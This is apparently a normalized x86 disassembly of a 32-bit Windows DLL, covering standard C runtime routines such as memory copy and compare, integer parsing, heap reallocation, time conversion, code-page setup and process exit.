cmp ecx 0x4
jb r-xdata
shr ecx 0x2
and edx 0x3
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov al [ esi + 0x2 ]
shr ecx 0x2
mov [ edi + 0x2 ] al
add esi 0x3
add edi 0x3
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
shr ecx 0x2
mov [ edi + 0x1 ] al
add esi 0x2
add edi 0x2
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
inc esi
shr ecx 0x2
inc edi
cmp ecx 0x8
jb r-xdata
mov eax [ esi + ecx * 4 - 0x1c ]
mov [ edi + ecx * 4 - 0x1c ] eax
mov eax [ esi + ecx * 4 - 0x18 ]
mov [ edi + ecx * 4 - 0x18 ] eax
mov eax [ esi + ecx * 4 - 0x14 ]
mov [ edi + ecx * 4 - 0x14 ] eax
mov eax [ esi + ecx * 4 - 0x10 ]
mov [ edi + ecx * 4 - 0x10 ] eax
mov eax [ esi + ecx * 4 - 0xc ]
mov [ edi + ecx * 4 - 0xc ] eax
mov eax [ esi + ecx * 4 - 0x8 ]
mov [ edi + ecx * 4 - 0x8 ] eax
mov eax [ esi + ecx * 4 - 0x4 ]
mov [ edi + ecx * 4 - 0x4 ] eax
lea eax [ ecx * 4 ]
add esi eax
add edi eax
jmp [ edx * 4 + jump_table_10004d28 ]
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
jmp [ ecx * 4 + jump_table_10004ec0 ]
and eax 0x3
sub ecx eax
jmp [ eax * 4 + jump_table_10004dc8 ]
neg ecx
jmp [ ecx * 4 + r-xdata ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_10004ec0 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_10004d28 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_10004d28 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_10004d28 ]
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
dec esi
shr ecx 0x2
dec edi
cmp ecx 0x8
jb r-xdata
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
shr ecx 0x2
mov [ edi + 0x2 ] al
sub esi 0x2
sub edi 0x2
cmp ecx 0x8
jb r-xdata
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov al [ esi + 0x1 ]
shr ecx 0x2
mov [ edi + 0x1 ] al
sub esi 0x3
sub edi 0x3
cmp ecx 0x8
jb r-xdata
mov eax [ esi + ecx * 4 + 0x1c ]
mov [ edi + ecx * 4 + 0x1c ] eax
mov eax [ esi + ecx * 4 + 0x18 ]
mov [ edi + ecx * 4 + 0x18 ] eax
mov eax [ esi + ecx * 4 + 0x14 ]
mov [ edi + ecx * 4 + 0x14 ] eax
mov eax [ esi + ecx * 4 + 0x10 ]
mov [ edi + ecx * 4 + 0x10 ] eax
mov eax [ esi + ecx * 4 + 0xc ]
mov [ edi + ecx * 4 + 0xc ] eax
mov eax [ esi + ecx * 4 + 0x8 ]
mov [ edi + ecx * 4 + 0x8 ] eax
mov eax [ esi + ecx * 4 + 0x4 ]
mov [ edi + ecx * 4 + 0x4 ] eax
lea eax [ ecx * 4 ]
add esi eax
add edi eax
jmp [ edx * 4 + jump_table_10004ec0 ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_10004ec0 ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_10004ec0 ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_10004ec0 ]
sub_10004f15
push esi
call sub_10004f91
mov ecx [ esp + 0x8 ]
xor esi esi
mov [ eax ] ecx
mov eax rw-data
call sub_10004f88
mov ecx [ esi * 8 + rw-data ]
pop esi
mov [ eax ] ecx
retn
add eax 0x8
inc esi
cmp eax rw-data
jl r-xdata
cmp ecx [ eax ]
je r-xdata
cmp ecx 0x13
jb r-xdata
cmp ecx 0xbc
jb r-xdata
cmp ecx 0x24
ja r-xdata
call sub_10004f88
mov [ eax ] 0x16
pop esi
retn
cmp ecx 0xca
ja r-xdata
call sub_10004f88
mov [ eax ] 0xd
pop esi
retn
call sub_10004f88
mov [ eax ] 0x8
pop esi
retn
sub_10004fa0
mov eax [ esp + 0xc ]
test eax eax
je r-xdata
retn
mov edx [ esp + 0x4 ]
push esi
push edi
mov esi edx
mov edi [ esp + 0x10 ]
or edx edi
and edx 0x3
je r-xdata
mov ecx eax
and eax 0x3
shr ecx 0x2
je r-xdata
test eax 0x1
je r-xdata
test eax eax
je r-xdata
[ esi ] [ edi ]
je r-xdata
mov cl [ esi ]
mov dl [ edi ]
cmp cl dl
jne r-xdata
mov cl [ esi ]
cmp cl [ edi ]
jne r-xdata
pop edi
pop esi
mov edx [ esi ]
mov ecx [ edi ]
cmp dl cl
jne r-xdata
mov ecx [ esi - 0x4 ]
mov edx [ edi - 0x4 ]
cmp cl dl
jne r-xdata
sbb eax eax
pop edi
sbb eax 0xffffffff
pop esi
retn
mov cl [ esi + 0x1 ]
mov dl [ edi + 0x1 ]
cmp cl dl
jne r-xdata
inc esi
inc edi
dec eax
je r-xdata
mov eax 0x0
dec eax
je r-xdata
cmp ch dh
jne r-xdata
add edi 0x2
add esi 0x2
sub eax 0x2
jne r-xdata
pop edi
pop esi
retn
cmp dh ch
jne r-xdata
shr ecx 0x10
shr edx 0x10
cmp cl dl
jne r-xdata
dec eax
je r-xdata
cmp ch dh
and ecx 0xff0000
and edx 0xff0000
cmp edx ecx
jne r-xdata
dec eax
sub_1000504c
push ebx
push ebp
push esi
push edi
mov edi [ esp + 0x14 ]
movzx eax [ edi ]
mov ecx [ rw-data ]
mov al [ ecx + eax * 2 ]
and eax 0x8
movzx eax [ edi ]
push 0x8
push eax
call sub_10009570
pop ecx
pop ecx
jmp r-xdata
movzx esi [ edi ]
inc edi
cmp esi 0x2d
mov ebp esi
je r-xdata
inc edi
jmp r-xdata
test eax eax
je r-xdata
movzx esi [ edi ]
inc edi
cmp esi 0x2b
jne r-xdata
cmp [ rw-data ] 0x1
jle r-xdata
mov eax [ rw-data ]
mov al [ eax + esi * 2 ]
and eax 0x4
push 0x4
push esi
call sub_10009570
pop ecx
pop ecx
jmp r-xdata
xor ebx ebx
cmp ebp 0x2d
mov eax ebx
jne r-xdata
lea eax [ ebx + ebx * 4 ]
lea ebx [ esi + eax * 2 - 0x30 ]
movzx esi [ edi ]
inc edi
jmp r-xdata
test eax eax
je r-xdata
pop edi
pop esi
pop ebp
pop ebx
retn
neg eax
cmp [ rw-data ] 0x1
jle r-xdata
sub_100050e2
push ebx
push esi
mov esi [ esp + 0x10 ]
cmp esi 0xffffffe0
jbe r-xdata
push 0x9
call sub_10006a09
mov ebx [ esp + 0x10 ]
push ebx
call sub_10006abd
pop ecx
test eax eax
pop ecx
je r-xdata
xor eax eax
jmp r-xdata
push 0x9
call sub_10006a6a
test esi esi
pop ecx
jne r-xdata
push edi
xor edi edi
cmp esi [ rw-data ]
ja r-xdata
pop esi
pop ebx
retn
add esi 0xf
and esi 0xfffffff0
push esi
push ebx
push 0x10
push [ rw-data ]
call [ HeapReAlloc@IAT ]
push 0x1
pop esi
push 0x9
call sub_10006a6a
pop ecx
mov eax edi
pop edi
jmp r-xdata
push esi
push ebx
push eax
call sub_100072c8
add esp 0xc
test eax eax
je r-xdata
mov edi ebx
sub_10005167
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0x8 ]
mov ecx [ edi + 0x14 ]
cmp ecx 0x45
jl r-xdata
or eax 0xffffffff
cmp ecx 0x8b
jg r-xdata
mov esi [ edi + 0x10 ]
test esi esi
jl r-xdata
push ebx
mov eax esi
push 0xc
cdq
pop ebx
idiv ebx
push ebx
add ecx eax
mov eax esi
cdq
pop esi
pop ebx
idiv esi
test edx edx
mov [ edi + 0x10 ] edx
jge r-xdata
cmp esi 0xb
jle r-xdata
cmp ecx 0x45
jl r-xdata
add edx 0xc
dec ecx
mov [ edi + 0x10 ] edx
mov edx [ edi + 0x10 ]
test cl 0x3
mov eax [ edx * 4 + rw-data ]
jne r-xdata
cmp ecx 0x8b
jg r-xdata
lea edx [ ecx - 0x1 ]
imul ecx ecx 0x16d
sar edx 0x2
add eax edx
lea eax [ ecx + eax - 0x63df ]
mov ecx [ edi + 0xc ]
test eax eax
lea esi [ eax + ecx ]
jl r-xdata
cmp edx 0x1
jle r-xdata
test ecx ecx
jge r-xdata
test ecx ecx
jl r-xdata
inc eax
lea ecx [ esi + esi * 2 ]
shl ecx 0x3
test esi esi
je r-xdata
test esi esi
jge r-xdata
test esi esi
jl r-xdata
xor eax eax
mov eax ecx
cdq
idiv esi
xor edx edx
cmp eax 0x18
setne dl
mov eax edx
jmp r-xdata
jmp r-xdata
mov eax [ edi + 0x8 ]
test ecx ecx
lea esi [ eax + ecx ]
jl r-xdata
test eax eax
jne r-xdata
test eax eax
jge r-xdata
test eax eax
jl r-xdata
mov ecx esi
imul ecx ecx 0x3c
test esi esi
je r-xdata
test esi esi
jge r-xdata
test esi esi
jl r-xdata
xor eax eax
mov eax ecx
cdq
idiv esi
xor edx edx
cmp eax 0x3c
setne dl
mov eax edx
jmp r-xdata
jmp r-xdata
mov eax [ edi + 0x4 ]
test ecx ecx
lea esi [ eax + ecx ]
jl r-xdata
test eax eax
jne r-xdata
test eax eax
jge r-xdata
test eax eax
jl r-xdata
mov ecx esi
imul ecx ecx 0x3c
test esi esi
je r-xdata
test esi esi
jge r-xdata
test esi esi
jl r-xdata
xor eax eax
mov eax ecx
cdq
idiv esi
xor edx edx
cmp eax 0x3c
setne dl
mov eax edx
jmp r-xdata
jmp r-xdata
mov eax [ edi ]
test ecx ecx
lea edx [ eax + ecx ]
mov [ ebp + 0x8 ] edx
jl r-xdata
test eax eax
jne r-xdata
test eax eax
jge r-xdata
test eax eax
jl r-xdata
cmp [ ebp + 0xc ] 0x0
je r-xdata
test edx edx
jge r-xdata
test edx edx
jl r-xdata
lea eax [ ebp + 0x8 ]
push eax
call sub_1000534b
test eax eax
pop ecx
je r-xdata
call sub_10009624
mov eax [ rw-data ]
add [ ebp + 0x8 ] eax
lea eax [ ebp + 0x8 ]
push eax
call sub_10005455
test eax eax
pop ecx
je r-xdata
jmp r-xdata
push 0x9
mov esi eax
mov eax [ ebp + 0x8 ]
pop ecx
[ edi ] [ esi ]
jmp r-xdata
mov ecx [ edi + 0x20 ]
test ecx ecx
jg r-xdata
pop edi
pop esi
pop ebp
retn
mov eax [ rw-data ]
add [ ebp + 0x8 ] eax
lea eax [ ebp + 0x8 ]
push eax
call sub_10005455
pop ecx
jmp r-xdata
jge r-xdata
cmp [ eax + 0x20 ] 0x0
jle r-xdata
sub_1000534b
mov eax [ esp + 0x4 ]
push ebx
push esi
push edi
mov esi [ eax ]
xor ebx ebx
call sub_100067bc
test esi esi
mov edi eax
jge r-xdata
cmp [ edi + 0x40 ] 0x0
jne r-xdata
xor eax eax
jmp r-xdata
mov ecx [ edi + 0x40 ]
push 0x24
call sub_100049d2
pop ecx
mov [ edi + 0x40 ] eax
test eax eax
mov ecx rw-data
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax esi
mov [ ecx + 0x14 ] edx
cdq
mov edi 0x15180
idiv edi
mov edi rw-data
mov [ ecx + 0x1c ] eax
imul eax eax 0xfffeae80
add esi eax
test ebx ebx
jne r-xdata
sub esi eax
inc edx
cmp esi eax
jl r-xdata
mov eax esi
mov edi 0x7861f80
cdq
idiv edi
mov edx eax
imul edx edx 0xf879e080
add esi edx
lea edx [ eax * 4 + 0x46 ]
mov eax 0x1e13380
cmp esi eax
jl r-xdata
mov edx [ ecx + 0x1c ]
push 0x1
pop eax
lea ebx [ edi + 0x4 ]
mov edi rw-data
sub esi eax
mov eax 0x1e28500
inc edx
cmp esi eax
jl r-xdata
mov edx [ ecx + 0x1c ]
dec eax
mov [ ecx + 0x10 ] eax
push 0x7
sub edx [ edi + eax * 4 ]
mov eax [ esp + 0x14 ]
mov edi 0x15180
mov [ ecx + 0xc ] edx
mov eax [ eax ]
cdq
idiv edi
pop edi
push 0x3c
add eax 0x4
cdq
idiv edi
mov eax esi
mov edi 0xe10
mov [ ecx + 0x18 ] edx
cdq
idiv edi
pop edi
mov [ ecx + 0x8 ] eax
imul eax eax 0xfffff1f0
add esi eax
mov eax esi
cdq
idiv edi
mov [ ecx + 0x4 ] eax
imul eax eax 0x3c
sub esi eax
and [ ecx + 0x20 ] 0x0
mov [ ecx ] esi
mov eax ecx
inc eax
add ebx 0x4
jmp r-xdata
push 0x1
pop ebx
inc edx
sub esi eax
jmp r-xdata
cmp [ ebx ] edx
jge r-xdata
sub_10005455
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
cmp [ esi ] 0x0
jge r-xdata
call sub_10009624
mov eax [ esi ]
cmp eax 0x3f480
jle r-xdata
xor eax eax
jmp r-xdata
push esi
call sub_1000534b
mov esi eax
push esi
call sub_100098d9
pop ecx
test eax eax
mov eax [ esi ]
pop ecx
je r-xdata
cmp eax 0x7ffc0b7f
jge r-xdata
pop esi
pop ebp
retn
sub eax [ rw-data ]
push edi
push 0x3c
mov [ ebp + 0x8 ] eax
pop ecx
cdq
mov edi ecx
idiv edi
test edx edx
mov [ esi ] edx
jge r-xdata
sub eax [ rw-data ]
sub eax [ rw-data ]
mov [ ebp + 0x8 ] eax
lea eax [ ebp + 0x8 ]
push eax
call sub_1000534b
cmp [ rw-data ] 0x0
pop ecx
mov esi eax
je r-xdata
mov eax [ ebp + 0x8 ]
mov edi ecx
cdq
idiv edi
add eax [ esi + 0x4 ]
mov [ ebp + 0x8 ] eax
cdq
idiv edi
pop edi
test edx edx
mov [ esi + 0x4 ] edx
jge r-xdata
add edx ecx
mov [ esi ] edx
sub [ ebp + 0x8 ] ecx
mov eax esi
push esi
call sub_100098d9
test eax eax
pop ecx
je r-xdata
mov eax [ ebp + 0x8 ]
push 0x18
cdq
idiv ecx
pop ecx
add eax [ esi + 0x8 ]
mov [ ebp + 0x8 ] eax
cdq
idiv ecx
test edx edx
mov [ esi + 0x8 ] edx
jge r-xdata
add edx 0x3c
mov [ esi + 0x4 ] edx
sub [ ebp + 0x8 ] ecx
mov eax [ rw-data ]
sub [ ebp + 0x8 ] eax
lea eax [ ebp + 0x8 ]
push eax
call sub_1000534b
mov esi eax
pop ecx
mov [ esi + 0x20 ] 0x1
jmp r-xdata
mov eax [ ebp + 0x8 ]
push 0x18
cdq
pop ecx
idiv ecx
mov ecx eax
test ecx ecx
mov [ ebp + 0x8 ] ecx
jle r-xdata
add edx ecx
mov [ esi + 0x8 ] edx
sub [ ebp + 0x8 ] ecx
jge r-xdata
mov eax [ esi + 0x18 ]
push 0x7
add eax ecx
pop ecx
cdq
idiv ecx
mov [ esi + 0x18 ] edx
mov eax [ ebp + 0x8 ]
add [ esi + 0xc ] eax
mov eax [ esi + 0x18 ]
push 0x7
lea eax [ eax + ecx + 0x7 ]
pop ecx
cdq
idiv ecx
mov [ esi + 0x18 ] edx
mov eax [ ebp + 0x8 ]
add [ esi + 0xc ] eax
mov eax [ esi + 0xc ]
test eax eax
jg r-xdata
mov eax [ ebp + 0x8 ]
add [ esi + 0x1c ] eax
add eax 0x1f
dec [ esi + 0x14 ]
mov [ esi + 0xc ] eax
mov [ esi + 0x1c ] 0x16c
mov [ esi + 0x10 ] 0xb
jmp r-xdata
sub_100055b5
push ebp
mov ebp esp
sub esp 0x18
push ebx
push esi
push edi
push 0x19
call sub_10006a09
push [ ebp + 0x8 ]
call sub_10005762
mov ebx eax
pop ecx
cmp ebx [ rw-data ]
pop ecx
mov [ ebp + 0x8 ] ebx
jne r-xdata
test ebx ebx
je r-xdata
xor esi esi
jmp r-xdata
call sub_100057df
xor edx edx
mov eax rw-data
push 0x19
call sub_10006a6a
pop ecx
mov eax esi
pop edi
pop esi
pop ebx
leave
retn
and [ ebp - 0x4 ] 0x0
push 0x40
pop ecx
xor eax eax
mov edi rw-data
lea esi [ edx + edx * 2 ]
[ edi ]
shl esi 0x4
stosb [ edi ]
lea ebx [ esi + rw-data ]
add eax 0x30
inc edx
cmp eax rw-data
jl r-xdata
inc [ ebp - 0x4 ]
add ebx 0x8
cmp [ ebp - 0x4 ] 0x4
jb r-xdata
mov dl [ ecx + 0x1 ]
test dl dl
je r-xdata
cmp [ eax ] ebx
je r-xdata
lea eax [ ebp - 0x18 ]
push eax
push ebx
call [ GetCPInfo@IAT ]
push 0x1
pop esi
cmp eax esi
jne r-xdata
cmp [ ebx ] 0x0
mov ecx ebx
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ rw-data ] 0x1
push eax
mov [ rw-data ] eax
call sub_100057ac
lea esi [ esi + rw-data ]
mov edi rw-data
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop ecx
mov [ rw-data ] eax
movsd [ edi ] [ esi ]
jmp r-xdata
movzx eax [ ecx ]
movzx edi dl
cmp eax edi
ja r-xdata
cmp [ rw-data ] 0x0
je r-xdata
push 0x40
and [ rw-data ] 0x0
pop ecx
xor eax eax
mov edi rw-data
cmp [ ebp - 0x18 ] esi
[ edi ]
stosb [ edi ]
mov [ rw-data ] ebx
jbe r-xdata
call sub_10005808
jmp r-xdata
inc ecx
inc ecx
cmp [ ecx ] 0x0
jne r-xdata
mov edx [ ebp - 0x4 ]
mov dl [ edx + rw-data ]
or esi 0xffffffff
and [ rw-data ] 0x0
cmp [ ebp - 0x12 ] 0x0
je r-xdata
or [ eax + rw-data ] dl
inc eax
cmp eax edi
jbe r-xdata
mov eax esi
lea ecx [ ebp - 0x11 ]
or [ eax + rw-data ] 0x8
inc eax
cmp eax 0xff
jb r-xdata
push ebx
call sub_100057ac
pop ecx
mov [ rw-data ] eax
mov [ rw-data ] esi
jmp r-xdata
movzx eax [ ecx - 0x1 ]
movzx edx dl
xor eax eax
mov edi rw-data
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
jmp r-xdata
inc ecx
inc ecx
cmp [ ecx - 0x1 ] 0x0
jne r-xdata
or [ eax + rw-data ] 0x4
inc eax
jmp r-xdata
mov dl [ ecx ]
test dl dl
je r-xdata
cmp eax edx
ja r-xdata
sub_10005762
mov eax [ esp + 0x4 ]
and [ rw-data ] 0x0
cmp eax 0xfffffffe
jne r-xdata
cmp eax 0xfffffffd
jne r-xdata
mov [ rw-data ] 0x1
jmp [ GetOEMCP@IAT ]
cmp eax 0xfffffffc
jne r-xdata
mov [ rw-data ] 0x1
jmp [ GetACP@IAT ]
retn
mov eax [ rw-data ]
mov [ rw-data ] 0x1
sub_100057ac
mov eax [ esp + 0x4 ]
sub eax 0x3a4
je r-xdata
mov eax 0x411
retn
sub eax 0x4
je r-xdata
mov eax 0x804
retn
sub eax 0xd
je r-xdata
mov eax 0x412
retn
dec eax
je r-xdata
mov eax 0x404
retn
xor eax eax
retn
sub_100057df
push edi
push 0x40
pop ecx
xor eax eax
mov edi rw-data
[ edi ]
stosb [ edi ]
xor eax eax
mov edi rw-data
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
pop edi
retn
sub_10005808
push ebp
mov ebp esp
sub esp 0x514
lea eax [ ebp - 0x14 ]
push esi
push eax
push [ rw-data ]
call [ GetCPInfo@IAT ]
cmp eax 0x1
jne r-xdata
xor eax eax
mov esi 0x100
xor eax eax
mov esi 0x100
cmp eax 0x61
jb r-xdata
cmp eax 0x5a
ja r-xdata
mov [ ebp + eax - 0x114 ] al
inc eax
cmp eax esi
jb r-xdata
mov al [ ebp - 0xe ]
mov [ ebp - 0x114 ] 0x20
test al al
je r-xdata
and [ eax + rw-data ] 0x0
cmp eax 0x7a
ja r-xdata
or [ eax + rw-data ] 0x10
mov cl al
add cl 0x20
push 0x0
lea eax [ ebp - 0x514 ]
push [ rw-data ]
push [ rw-data ]
push eax
lea eax [ ebp - 0x114 ]
push esi
push eax
push 0x1
call sub_10009be6
push 0x0
lea eax [ ebp - 0x214 ]
push [ rw-data ]
push esi
push eax
lea eax [ ebp - 0x114 ]
push esi
push eax
push esi
push [ rw-data ]
call sub_1000931a
push 0x0
lea eax [ ebp - 0x314 ]
push [ rw-data ]
push esi
push eax
lea eax [ ebp - 0x114 ]
push esi
push eax
push 0x200
push [ rw-data ]
call sub_1000931a
add esp 0x5c
xor eax eax
lea ecx [ ebp - 0x514 ]
push ebx
push edi
lea edx [ ebp - 0xd ]
cmp eax 0x41
jb r-xdata
pop esi
leave
retn
or [ eax + rw-data ] 0x20
mov cl al
sub cl 0x20
jmp r-xdata
inc eax
cmp eax esi
jb r-xdata
test dl 0x2
je r-xdata
or [ eax + rw-data ] 0x10
mov dl [ ebp + eax - 0x214 ]
inc edx
inc edx
mov al [ edx - 0x1 ]
test al al
jne r-xdata
sub ecx eax
lea edi [ ebp + eax - 0x114 ]
inc ecx
mov eax 0x20202020
mov ebx ecx
shr ecx 0x2
[ edi ]
mov ecx ebx
and ecx 0x3
[ edi ]
mov [ eax + rw-data ] cl
jmp r-xdata
and [ eax + rw-data ] 0x0
or [ eax + rw-data ] 0x20
mov dl [ ebp + eax - 0x314 ]
jmp r-xdata
inc eax
inc ecx
inc ecx
cmp eax esi
jb r-xdata
movzx ecx [ edx ]
movzx eax al
cmp eax ecx
ja r-xdata
pop edi
pop ebx
mov dx [ ecx ]
test dl 0x1
je r-xdata
jmp r-xdata
mov [ eax + rw-data ] dl
jmp r-xdata
sub_10005a07
push edi
call sub_10005aac
push 0x1
pop edi
cmp [ rw-data ] edi
jne r-xdata
cmp [ esp + 0xc ] 0x0
push ebx
mov ebx [ esp + 0x14 ]
mov [ rw-data ] edi
mov [ rw-data ] bl
jne r-xdata
push [ esp + 0x8 ]
call [ GetCurrentProcess@IAT ]
push eax
call [ TerminateProcess@IAT ]
push rw-data
push rw-data
call sub_10005abe
pop ecx
pop ecx
test ebx ebx
pop ebx
je r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
push [ esp + 0x8 ]
mov [ rw-data ] edi
call [ ExitProcess@IAT ]
call sub_10005ab5
pop edi
retn
push rw-data
push rw-data
call sub_10005abe
pop ecx
pop ecx
mov ecx [ rw-data ]
push esi
lea esi [ ecx - 0x4 ]
cmp esi eax
jb r-xdata
pop esi
mov eax [ esi ]
test eax eax
je r-xdata
sub esi 0x4
cmp esi [ rw-data ]
jae r-xdata
call eax
sub_10005ae0
push ebp
mov ebp esp
push edi
push esi
mov esi [ ebp + 0xc ]
mov ecx [ ebp + 0x10 ]
mov edi [ ebp + 0x8 ]
mov eax ecx
mov edx ecx
add eax esi
cmp edi esi
jbe r-xdata
test edi 0x3
jne r-xdata
cmp edi eax
jb r-xdata
mov eax edi
mov edx 0x3
sub ecx 0x4
jb r-xdata
shr ecx 0x2
and edx 0x3
cmp ecx 0x8
jb r-xdata
lea esi [ ecx + esi - 0x4 ]
lea edi [ ecx + edi - 0x4 ]
test edi 0x3
jne r-xdata
jmp [ ecx * 4 + r-xdata ]
and eax 0x3
add ecx eax
jmp [ eax * 4 + jump_table_10005b40 ]
jmp [ ecx * 4 + jump_table_10005bbc ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_10005c28 ]
mov eax edi
mov edx 0x3
cmp ecx 0x4
jb r-xdata
shr ecx 0x2
and edx 0x3
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov al [ esi + 0x2 ]
shr ecx 0x2
mov [ edi + 0x2 ] al
add esi 0x3
add edi 0x3
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
shr ecx 0x2
mov [ edi + 0x1 ] al
add esi 0x2
add edi 0x2
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
inc esi
shr ecx 0x2
inc edi
cmp ecx 0x8
jb r-xdata
mov eax [ esi + ecx * 4 - 0x1c ]
mov [ edi + ecx * 4 - 0x1c ] eax
mov eax [ esi + ecx * 4 - 0x18 ]
mov [ edi + ecx * 4 - 0x18 ] eax
mov eax [ esi + ecx * 4 - 0x14 ]
mov [ edi + ecx * 4 - 0x14 ] eax
mov eax [ esi + ecx * 4 - 0x10 ]
mov [ edi + ecx * 4 - 0x10 ] eax
mov eax [ esi + ecx * 4 - 0xc ]
mov [ edi + ecx * 4 - 0xc ] eax
mov eax [ esi + ecx * 4 - 0x8 ]
mov [ edi + ecx * 4 - 0x8 ] eax
mov eax [ esi + ecx * 4 - 0x4 ]
mov [ edi + ecx * 4 - 0x4 ] eax
lea eax [ ecx * 4 ]
add esi eax
add edi eax
jmp [ edx * 4 + jump_table_10005c28 ]
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
jmp [ ecx * 4 + jump_table_10005dc0 ]
and eax 0x3
sub ecx eax
jmp [ eax * 4 + jump_table_10005cc8 ]
neg ecx
jmp [ ecx * 4 + r-xdata ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_10005dc0 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_10005c28 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_10005c28 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_10005c28 ]
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
dec esi
shr ecx 0x2
dec edi
cmp ecx 0x8
jb r-xdata
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
shr ecx 0x2
mov [ edi + 0x2 ] al
sub esi 0x2
sub edi 0x2
cmp ecx 0x8
jb r-xdata
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov al [ esi + 0x1 ]
shr ecx 0x2
mov [ edi + 0x1 ] al
sub esi 0x3
sub edi 0x3
cmp ecx 0x8
jb r-xdata
mov eax [ esi + ecx * 4 + 0x1c ]
mov [ edi + ecx * 4 + 0x1c ] eax
mov eax [ esi + ecx * 4 + 0x18 ]
mov [ edi + ecx * 4 + 0x18 ] eax
mov eax [ esi + ecx * 4 + 0x14 ]
mov [ edi + ecx * 4 + 0x14 ] eax
mov eax [ esi + ecx * 4 + 0x10 ]
mov [ edi + ecx * 4 + 0x10 ] eax
mov eax [ esi + ecx * 4 + 0xc ]
mov [ edi + ecx * 4 + 0xc ] eax
mov eax [ esi + ecx * 4 + 0x8 ]
mov [ edi + ecx * 4 + 0x8 ] eax
mov eax [ esi + ecx * 4 + 0x4 ]
mov [ edi + ecx * 4 + 0x4 ] eax
lea eax [ ecx * 4 ]
add esi eax
add edi eax
jmp [ edx * 4 + jump_table_10005dc0 ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_10005dc0 ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_10005dc0 ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_10005dc0 ]
sub_10005e15
push ebp
mov ebp esp
